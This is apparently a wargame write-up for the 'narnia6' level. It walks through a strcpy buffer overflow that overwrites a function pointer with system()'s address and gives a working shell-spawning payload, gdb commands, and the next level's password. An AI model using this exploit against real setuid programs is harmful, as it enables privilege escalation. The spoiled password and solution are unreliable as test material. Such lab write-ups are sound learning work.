# Overview
We get the following C code:
```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```

The goal here is to overwrite the function pointer `fp`. Typically we want to call `system()` instead of `puts()`.

# Overwriting the function pointer
Here the stack layout:
```
          +--------------------------+
  esp --> |            b2            |
          |                          |
          +--------------------------+
          |            b1            |
          |                          |
          +--------------------------+
          |            fp            |
          +--------------------------+
          |            i             |
          +--------------------------+
          |           ???            |
          +--------------------------+
  esp --> |                          |
                       ...             
```

There are unsafe `strcpy()` calls:
- we can pass 12 bytes in argv[1] which will overwrite `b1` and `fp` (and technically a null byte will be written in `i` too)
- we can pass 12 bytes in argv[2] which will overwrite `b2` and `b1`
- in the end `fp` contains the address of the function we want to jump to, and `b1` contains the argument for that function

# But with what address??
Here comes the PLT and GOT. I don't understand 100% how it works, but essentially it means that when calling a dynamic library function a stub is called. The stub invokes the dynamic loader, passing the identifier of the library function, and the dynamic loader returns the actual address of the function. The stub is also updated, and next time the library function is called, the stub calls it directly.

There is more information here:
- https://ayedaemon.github.io/post/2024/04/elf-chronicles-plt-got/
- https://rafaelbeirigo.github.io/cybersec-dojo/research/2025/11/01/how-to-get-the-got-address-from-a-plt-stub-using-gdb.html

My first idea was to look for the `system()` stub, however the compiler only adds stubs for library functions called by the binary. However, ASLR is disabled on the target machine, so I compiled a binary calling `system()`, and copied over the address of the function.

The final payload is:
```sh
/narnia/narnia6 $(python3 -c "import sys; sys.stdout.buffer.write(b'01234567\x30\xd4\xdc\xf7')") $(python3 -c "import sys; sys.stdout.buffer.write(b'01234567/bin/sh')")
```

# Debugging
Some debugging commands:
```
cd $(mktemp -d)

set disassembly-flavor intel
source /opt/gef/gdbinit.py
gef config context.nb_lines_stack 40
break *main+232
run


gdb --command=cmds --args /narnia/narnia6 $(python3 -c "import sys; sys.stdout.buffer.write(b'01234567\x30\xd4\xdc\xf7')") $(python3 -c "import sys; sys.stdout.buffer.write(b'01234567/bin/sh')")
```

# The end
Password for the next level is `54RtepCEU0`.
